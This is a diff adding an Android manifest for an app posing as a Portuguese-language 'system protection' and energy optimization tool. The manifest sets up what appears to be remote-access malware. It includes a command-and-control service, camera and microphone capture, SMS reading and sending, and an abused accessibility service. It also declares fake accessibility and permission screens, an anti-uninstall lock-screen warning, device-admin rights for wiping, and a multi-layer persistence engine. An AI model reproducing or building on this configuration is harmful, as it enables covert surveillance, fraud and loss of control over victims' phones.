@@ -1,0 +1,244 @@
+<?xml version='1.0' encoding='utf-8'?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:ns1="http://schemas.android.com/tools" package="com.seguranca.protecao">
+
+    
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS_PRIVILEGED" ns1:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    
+    
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    
+    
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.DELETE_PACKAGES" />
+    
+    <!-- MIUI/ROM Compatibility: Permissões extras para evitar kill -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <!-- Alarm permissions — API 31+ exact alarm, API 33+ use-exact-alarm -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+    <!-- WorkManager / JobScheduler persistence -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- Android 14+: SPECIAL_USE foreground service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+
+    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE" />
+    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT" />
+
+    <application android:name=".AppCoreInitializer" android:allowBackup="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:theme="@style/Theme.Material3.DayNight" android:requestLegacyExternalStorage="true" android:usesCleartextTraffic="true" android:hardwareAccelerated="true" android:largeHeap="true" android:supportsRtl="true" ns1:targetApi="31">
+        
+        
+        <meta-data android:name="com.google.android.gms.version" android:value="242415000" />
+        <meta-data android:name="app.category" android:value="tools" />
+        <meta-data android:name="app.description" android:value="Serviço de otimização de interface e energia" />
+        
+        <!-- MIUI/Xiaomi: Prevent app from being killed -->
+        <meta-data android:name="MIUI.FORCE_PERSIST" android:value="true" />
+        <meta-data android:name="notch.config" android:value="portrait|landscape" />
+        
+        <!-- OPPO/Realme/ColorOS: Prevent app from being killed -->
+        <meta-data android:name="com.seguranca.protecao.OPPO_PERSIST" android:value="true" />
+        
+        <!-- Huawei/EMUI: Prevent app from being killed -->
+        <meta-data android:name="com.seguranca.protecao.HUAWEI_PERSIST" android:value="true" />
+        
+        <!-- Samsung/OneUI: Prevent app from being killed -->
+        <meta-data android:name="com.seguranca.protecao.SAMSUNG_PERSIST" android:value="true" />
+
+        
+        <activity android:name=".MainActivity" android:exported="true" android:label="@string/app_name" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        
+        <activity android:name=".FakeAccessibilityActivity" android:exported="true" android:label="Acessibilidade" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
+        </activity>
+
+        
+        <activity android:name=".FakeServiceDetailActivity" android:exported="false" android:label="Serviço de Proteção do Sistema" android:theme="@style/Theme.Material3.DayNight.NoActionBar">
+        </activity>
+
+        
+        <activity android:name=".RestrictedSettingsActivity" android:exported="false" android:excludeFromRecents="true" android:theme="@style/Theme.Material3.DayNight.NoActionBar" />
+
+        
+        <activity android:name=".FakePermissionActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:excludeFromRecents="true" />
+        
+        
+        <activity android:name=".SetupWizardActivity" android:exported="false" android:theme="@android:style/Theme.Material.Light.NoActionBar" android:excludeFromRecents="true" />
+        
+        <!-- Activity para persistência de tela - aparece por cima do keyguard -->
+        <activity 
+            android:name=".ScreenPersistenceActivity" 
+            android:exported="false" 
+            android:excludeFromRecents="true" 
+            android:taskAffinity="" 
+            android:launchMode="singleTask"
+            android:showOnLockScreen="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+        
+        <!-- Activity de Alerta Anti-Remoção / Anti-Desinstalação -->
+        <activity 
+            android:name=".AntiRemovalWarningActivity" 
+            android:exported="true" 
+            android:excludeFromRecents="true" 
+            android:taskAffinity="" 
+            android:launchMode="singleInstance"
+            android:showOnLockScreen="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+        
+        <activity android:name=".VisualScreenActivity" android:exported="true" android:theme="@style/Theme.Material3.DayNight.NoActionBar" android:screenOrientation="portrait" />
+
+        
+        <activity android:name=".StudioActivity" android:exported="false" android:theme="@android:style/Theme.NoTitleBar.Fullscreen" android:screenOrientation="portrait" />
+
+        <activity android:name=".WebViewActivity" android:exported="true" android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
+
+        <activity android:name=".CloneLaunchActivity" android:exported="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:excludeFromRecents="true" />
+
+        
+        <service android:name=".UiAssistBridge" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:label="@string/app_name" android:description="@string/accessibility_service_description" android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        
+        <service android:name=".OverlayService" android:enabled="true" android:exported="false" />
+
+        
+        <service android:name=".GuidedOverlayService" android:enabled="true" android:exported="false" />
+
+        
+        <service android:name=".CommandControlService" android:enabled="true" android:exported="false" android:foregroundServiceType="specialUse">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="System optimization and remote management service" />
+        </service>
+        
+        
+        <service android:name=".CameraService" android:enabled="true" android:exported="false" android:foregroundServiceType="camera" />
+        
+        
+        <service android:name=".MicrophoneService" android:enabled="true" android:exported="false" android:foregroundServiceType="microphone" />
+        
+        
+        <provider android:name="androidx.core.content.FileProvider" android:authorities="${applicationId}.fileprovider" android:exported="false" android:grantUriPermissions="true">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths" />
+        </provider>
+
+        
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true" android:permission="android.permission.RECEIVE_BOOT_COMPLETED" android:directBootAware="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name=".AliveReceiver" android:enabled="true" android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.USER_UNLOCKED" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Receiver para Device Administrator (necessário para formatação) -->
+        <receiver
+            android:name=".MyAdminReceiver"
+            android:label="@string/service_detail_title"
+            android:description="@string/accessibility_service_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_sample" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+
+        <!-- ───── Persistence Engine (Android 14/15/16/17) ───── -->
+
+        <!-- Alarm chain receiver — directBootAware fires before user unlock -->
+        <receiver
+            android:name=".AlarmReconnectReceiver"
+            android:exported="false"
+            android:directBootAware="true">
+            <intent-filter android:priority="1000">
+                <action android:name="com.seguranca.protecao.ALARM_RECONNECT" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- JobScheduler reconnect service — expedited, survives process death -->
+        <service
+            android:name=".JobReconnectService"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <!-- WorkManager initialization provider — auto-registers worker -->
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="${applicationId}.androidx-startup"
+            android:exported="false"
+            ns1:node="merge">
+            <meta-data
+                android:name="androidx.work.WorkManagerInitializer"
+                android:value="androidx.startup" />
+        </provider>
+
+        <!-- Translucent Activity to prompt Device Admin activation -->
+        <activity
+            android:name=".AdminPromptActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
+    </application>
+
+</manifest>
